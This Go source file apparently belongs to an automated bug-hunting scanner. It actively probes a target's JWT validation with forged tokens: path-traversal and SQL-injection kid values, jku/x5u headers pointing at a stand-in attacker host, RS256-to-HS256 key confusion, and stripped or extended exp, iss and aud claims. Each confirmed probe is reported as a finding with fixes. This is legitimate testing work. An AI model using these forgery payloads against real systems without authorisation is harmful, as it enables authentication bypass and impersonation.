package scanner

import (
	"context"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"auto-bughunter/backend/internal/model"
)

// jwtAdvancedBodyLimit caps per-probe response reads.
const jwtAdvancedBodyLimit = 128 * 1024

// jwksDiscoveryPaths are well-known JWKS and OpenID configuration paths.
var jwksDiscoveryPaths = []string{
	"/.well-known/jwks.json",
	"/.well-known/openid-configuration",
	"/oauth2/jwks",
	"/jwks.json",
	"/api/auth/jwks",
}

// RunJWTAdvancedProbe tests advanced JWT vulnerabilities that are distinct from
// the basic alg:none / weak-secret probes in jwt_probe.go:
//
//  1. kid path-traversal / SQL injection.
//  2. jku / x5u / jwks_url header injection.
//  3. RS256 → HS256 algorithm confusion.
//  4. exp far-future tampering.
//  5. Missing iss / aud validation.
func (s *Service) RunJWTAdvancedProbe(
	ctx context.Context,
	target string,
	scanScope model.ScanScope,
	options model.ScanOptions,
	auth model.ScanAuthProfile,
	emit func(model.ScanEvent),
) []model.Finding {
	if options.PassiveOnly || target == "" {
		return nil
	}

	raw := oauthExtractBearerToken(auth)
	if raw == "" || !isJWT(raw) {
		return nil
	}

	hdr, payload, _, err := parseJWT(raw)
	if err != nil {
		return nil
	}

	if emit != nil {
		emit(model.ScanEvent{
			Type:    model.ScanEventCommand,
			Command: fmt.Sprintf("jwt-advanced-probe %s", target),
			Message: "Testing advanced JWT vulnerabilities: kid injection, jku header, RS256→HS256 confusion, exp tampering, missing aud/iss",
		})
	}

	runInput := RunInput{
		Target:      target,
		Scope:       scanScope,
		Options:     options,
		AuthProfile: auth,
	}
	baselines, ok := s.captureJWTAuthenticatedBaselines(ctx, runInput, raw)
	if !ok {
		return nil
	}

	var findings []model.Finding
	emitted := map[string]bool{}

	appendFinding := func(fid string, forgedToken string, status int, body []byte, finding model.Finding) {
		if !jwtResponseMatchesAuthenticatedBaseline(status, body, baselines) {
			return
		}
		diffOutcome := s.jwtDifferentialReVerify(ctx, runInput, "jwt-advanced-probe", raw, forgedToken, baselines)
		if diffOutcome.Ran && !diffOutcome.Confirmed {
			return
		}
		AttachDifferentialEvidence(&finding, diffOutcome)
		emitted[fid] = true
		findings = append(findings, finding)
	}

	// ── Probe 1: kid path-traversal / SQL injection ────────────────────────
	fid := "jwt-kid-injection"
	if !emitted[fid] {
		kidPayloads := []struct {
			kid       string
			technique string
		}{
			{"../../dev/null", "path-traversal to /dev/null — server reads empty file as key"},
			{"../../etc/passwd", "path-traversal to /etc/passwd — server reads passwd as key"},
			{"' UNION SELECT 'secret'-- -", "SQL injection in kid lookup — forces known key"},
			{"../../../../../dev/null", "deep path-traversal"},
		}
		for _, kp := range kidPayloads {
			forgedHdr := clonePayload(hdr)
			forgedHdr["kid"] = kp.kid
			token, err := buildJWT(forgedHdr, payload, "")
			if err != nil {
				continue
			}
			status, body, err := s.sendWithJWT(ctx, runInput, token)
			if err != nil {
				continue
			}
			finding := jwtAdvancedFinding(
				fid, target, model.SeverityHigh,
				"JWT kid header injection — server accepted manipulated key ID",
				fmt.Sprintf(
					"A JWT with kid=%q was accepted by %s (HTTP %d). "+
						"Technique: %s. "+
						"The server appears to use the kid header to locate the signing key "+
						"without safe path/query validation, enabling key injection.",
					kp.kid, target, status, kp.technique,
				),
				"CWE-22",
				[]string{
					"Craft a JWT with kid set to a path-traversal or SQL injection payload.",
					"Sign the token with an empty secret (or the SQL-injected secret).",
					"Send the token to: " + target,
					"Observe that the server accepts the forged token.",
				},
				map[string]string{
					"kid":                kp.kid,
					"technique":          kp.technique,
					"authBaselineStatus": fmt.Sprintf("%d", baselines.First.Status),
				},
			)
			appendFinding(fid, token, status, body, finding)
			if emitted[fid] {
				break
			}
		}
	}

	// ── Probe 2: jku / jwks_url header injection ───────────────────────────
	fid = "jwt-jku-injection"
	if !emitted[fid] {
		attackerJWKS := "https://abh-probe-jwks.attacker.example.com/.well-known/jwks.json"
		for _, hdrKey := range []string{"jku", "x5u", "jwks_url"} {
			forgedHdr := clonePayload(hdr)
			forgedHdr[hdrKey] = attackerJWKS
			forgedHdr["alg"] = "none"
			token, err := buildJWT(forgedHdr, payload, "")
			if err != nil {
				continue
			}
			status, body, err := s.sendWithJWT(ctx, runInput, token)
			if err != nil {
				continue
			}
			finding := jwtAdvancedFinding(
				fid, target, model.SeverityCritical,
				"JWT jku/x5u header injection — server trusts attacker-supplied JWKS URL",
				fmt.Sprintf(
					"A JWT with %s=%q (and alg:none) was accepted by %s (HTTP %d). "+
						"The server may have fetched the attacker-controlled JWKS URL "+
						"to retrieve the verification key, allowing the attacker to sign "+
						"arbitrary JWTs with their own key and have them accepted.",
					hdrKey, attackerJWKS, target, status,
				),
				"CWE-347",
				[]string{
					"Host a JWKS document at an attacker-controlled URL.",
					"Craft a JWT with jku pointing to that URL.",
					"Sign the token with the corresponding private key.",
					"Present the token to: " + target,
					"Observe that the server fetches the JWKS and accepts the forged token.",
				},
				map[string]string{
					"headerKey":          hdrKey,
					"attackerJWKS":       attackerJWKS,
					"responseStatus":     fmt.Sprintf("%d", status),
					"bodySnippet":        truncateString(string(body), 80),
					"authBaselineStatus": fmt.Sprintf("%d", baselines.First.Status),
				},
			)
			appendFinding(fid, token, status, body, finding)
			if emitted[fid] {
				break
			}
		}
	}

	// ── Probe 3: RS256 → HS256 algorithm confusion ─────────────────────────
	fid = "jwt-rs256-to-hs256-confusion"
	if !emitted[fid] {
		publicKey := jwtFetchPublicKey(ctx, s, target, options, auth)
		if publicKey != "" {
			hs256Hdr := clonePayload(hdr)
			hs256Hdr["alg"] = "HS256"
			delete(hs256Hdr, "kid")
			delete(hs256Hdr, "jku")
			token, err := buildJWT(hs256Hdr, payload, publicKey)
			if err == nil {
				status, body, err := s.sendWithJWT(ctx, runInput, token)
				if err == nil {
					finding := jwtAdvancedFinding(
						fid, target, model.SeverityHigh,
						"JWT RS256→HS256 algorithm confusion — public key accepted as HMAC secret",
						fmt.Sprintf(
							"A JWT re-signed with the server's own RSA public key as an "+
								"HMAC-SHA256 secret was accepted by %s (HTTP %d). "+
								"This means the JWT library treats the public key as the HMAC "+
								"secret when alg=HS256, allowing anyone who knows the public key "+
								"to forge arbitrary tokens.",
							target, status,
						),
						"CWE-327",
						[]string{
							"Obtain the server's RSA public key from /.well-known/jwks.json or x5c.",
							"Craft a JWT with alg=HS256 and sign it using the RSA public key as the HMAC secret.",
							"Send the token to: " + target,
							"Observe that the server accepts the forged token.",
						},
						map[string]string{
							"algorithm":          "HS256 (with RSA public key as secret)",
							"responseStatus":     fmt.Sprintf("%d", status),
							"authBaselineStatus": fmt.Sprintf("%d", baselines.First.Status),
						},
					)
					appendFinding(fid, token, status, body, finding)
				}
			}
		}
	}

	// ── Probe 4: exp far-future tampering ─────────────────────────────────
	fid = "jwt-exp-not-validated"
	if !emitted[fid] {
		noExpPayload := clonePayload(payload)
		delete(noExpPayload, "exp")
		token, err := buildJWT(hdr, noExpPayload, "")
		if err == nil && token != raw {
			status, body, err := s.sendWithJWT(ctx, runInput, token)
			if err == nil {
				finding := jwtAdvancedFinding(
					fid, target, model.SeverityMedium,
					"JWT accepted without expiry (exp) claim",
					fmt.Sprintf(
						"A JWT with the exp claim removed was accepted by %s (HTTP %d). "+
							"Without an expiry claim the token is valid indefinitely, "+
							"meaning a stolen token can be replayed with no time limit.",
						target, status,
					),
					"CWE-347",
					[]string{
						"Remove the exp claim from a valid JWT.",
						"Send the modified token to: " + target,
						"Observe that the server accepts the token.",
					},
					map[string]string{
						"expClaimPresent":    "false",
						"responseStatus":     fmt.Sprintf("%d", status),
						"authBaselineStatus": fmt.Sprintf("%d", baselines.First.Status),
					},
				)
				appendFinding(fid, token, status, body, finding)
			}
		}
		if !emitted[fid] {
			farFuturePayload := clonePayload(payload)
			farFuturePayload["exp"] = float64(time.Now().Add(10 * 365 * 24 * time.Hour).Unix())
			token2, err := buildJWT(hdr, farFuturePayload, "")
			if err == nil && token2 != raw {
				status2, body2, err := s.sendWithJWT(ctx, runInput, token2)
				if err == nil {
					finding := jwtAdvancedFinding(
						fid, target, model.SeverityMedium,
						"JWT accepted with exp set 10 years in the future",
						fmt.Sprintf(
							"A JWT with exp set ~10 years in the future was accepted by %s (HTTP %d). "+
								"While exp is present, the server does not enforce a maximum token lifetime, "+
								"allowing tokens with implausibly long lifetimes to be forged.",
							target, status2,
						),
						"CWE-347",
						[]string{
							"Set exp in a JWT to a timestamp 10 years from now.",
							"Send the modified token to: " + target,
							"Observe that the server accepts the implausibly long-lived token.",
						},
						map[string]string{
							"expValue":           "10 years from now",
							"responseStatus":     fmt.Sprintf("%d", status2),
							"authBaselineStatus": fmt.Sprintf("%d", baselines.First.Status),
						},
					)
					appendFinding(fid, token2, status2, body2, finding)
				}
			}
		}
	}

	// ── Probe 5: Missing iss / aud validation ─────────────────────────────
	fid = "jwt-missing-iss-aud-validation"
	if !emitted[fid] {
		noIssAudPayload := clonePayload(payload)
		delete(noIssAudPayload, "iss")
		delete(noIssAudPayload, "aud")
		token, err := buildJWT(hdr, noIssAudPayload, "")
		if err == nil && token != raw {
			status, body, err := s.sendWithJWT(ctx, runInput, token)
			if err == nil {
				finding := jwtAdvancedFinding(
					fid, target, model.SeverityHigh,
					"JWT accepted without iss and aud claims — cross-service token portability possible",
					fmt.Sprintf(
						"A JWT with both the iss (issuer) and aud (audience) claims removed was "+
							"accepted by %s (HTTP %d). Without iss/aud validation, a token issued "+
							"by a different authority for a different service can be replayed at "+
							"this endpoint, enabling cross-service impersonation.",
						target, status,
					),
					"CWE-287",
					[]string{
						"Remove the iss and aud claims from a valid JWT.",
						"Send the modified token to: " + target,
						"Observe that the server accepts the token.",
						"Repeat with a token from a different service using the same signing key.",
					},
					map[string]string{
						"issClaimPresent":    "false",
						"audClaimPresent":    "false",
						"responseStatus":     fmt.Sprintf("%d", status),
						"authBaselineStatus": fmt.Sprintf("%d", baselines.First.Status),
					},
				)
				appendFinding(fid, token, status, body, finding)
			}
		}
	}

	return findings
}

// jwtAdvancedFinding constructs a standardized Finding for the JWT advanced probe.
func jwtAdvancedFinding(id, endpoint string, severity model.Severity, title, evidence, cwe string, steps []string, extra map[string]string) model.Finding {
	ef := map[string]string{"validationType": "active-probe"}
	for k, v := range extra {
		ef[k] = v
	}
	return model.Finding{
		ID:                id,
		Category:          "authentication",
		Severity:          severity,
		Title:             title,
		Description:       "An advanced JWT vulnerability was confirmed. The authorization server does not correctly validate the token's header parameters or claims, enabling token forgery or replay attacks.",
		Evidence:          evidence,
		Recommendation:    "Fix the JWT validation logic to: (1) allowlist permitted algorithms and reject all others, (2) validate kid safely without filesystem or SQL exposure, (3) prohibit jku/x5u headers or pin to a pre-configured JWKS URI, (4) enforce iss and aud claims, (5) enforce token lifetime with a maximum cap.",
		Confidence:        0.82,
		AffectedURL:       endpoint,
		CWE:               cwe,
		OWASPCategory:     "A07:2021 - Identification and Authentication Failures",
		Sources:           []string{"active-scanner", "jwt-advanced-probe"},
		ReproductionSteps: steps,
		BusinessTags:      []string{"jwt", "token-forgery", "algorithm-confusion"},
		EvidenceFields:    ef,
	}
}

// jwtFetchPublicKey attempts to retrieve an RSA public key from JWKS or
// OpenID configuration and returns it as a PEM string. Returns empty if not found.
func jwtFetchPublicKey(ctx context.Context, s *Service, target string, options model.ScanOptions, auth model.ScanAuthProfile) string {
	baseURL := strings.TrimRight(target, "/")
	// Derive origin.
	if idx := strings.Index(baseURL, "://"); idx >= 0 {
		parts := strings.SplitN(baseURL[idx+3:], "/", 2)
		baseURL = baseURL[:idx+3] + parts[0]
	}

	for _, path := range jwksDiscoveryPaths {
		ep := baseURL + path
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, ep, nil)
		if err != nil {
			continue
		}
		ApplyAuthProfile(req, auth)
		resp, err := s.doRequestWithRetry(ctx, req, options)
		if err != nil || resp == nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, jwtAdvancedBodyLimit))
		_ = resp.Body.Close()
		if resp.StatusCode != 200 {
			continue
		}

		// If it's an OpenID config, follow jwks_uri.
		if strings.Contains(path, "openid-configuration") {
			var oidcConfig map[string]interface{}
			if err := json.Unmarshal(body, &oidcConfig); err == nil {
				if jwksURI, ok := oidcConfig["jwks_uri"].(string); ok {
					req2, err := http.NewRequestWithContext(ctx, http.MethodGet, jwksURI, nil)
					if err == nil {
						resp2, err := s.doRequestWithRetry(ctx, req2, options)
						if err == nil && resp2 != nil && resp2.StatusCode == 200 {
							body, _ = io.ReadAll(io.LimitReader(resp2.Body, jwtAdvancedBodyLimit))
							_ = resp2.Body.Close()
						}
					}
				}
			}
		}

		pubKey := jwtExtractPublicKeyFromJWKS(body)
		if pubKey != "" {
			return pubKey
		}
	}
	return ""
}

// jwtExtractPublicKeyFromJWKS parses a JWKS JSON and returns the first RSA
// public key as a PEM string.
func jwtExtractPublicKeyFromJWKS(jwksBody []byte) string {
	var jwks struct {
		Keys []map[string]interface{} `json:"keys"`
	}
	if err := json.Unmarshal(jwksBody, &jwks); err != nil {
		return ""
	}
	for _, key := range jwks.Keys {
		kty, _ := key["kty"].(string)
		if strings.ToUpper(kty) != "RSA" {
			continue
		}
		x5c, _ := key["x5c"].([]interface{})
		if len(x5c) > 0 {
			certDER, err := base64.StdEncoding.DecodeString(fmt.Sprintf("%v", x5c[0]))
			if err != nil {
				continue
			}
			cert, err := x509.ParseCertificate(certDER)
			if err != nil {
				continue
			}
			rsaPub, ok := cert.PublicKey.(*rsa.PublicKey)
			if !ok {
				continue
			}
			der, err := x509.MarshalPKIXPublicKey(rsaPub)
			if err != nil {
				continue
			}
			return string(pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: der}))
		}
	}
	return ""
}
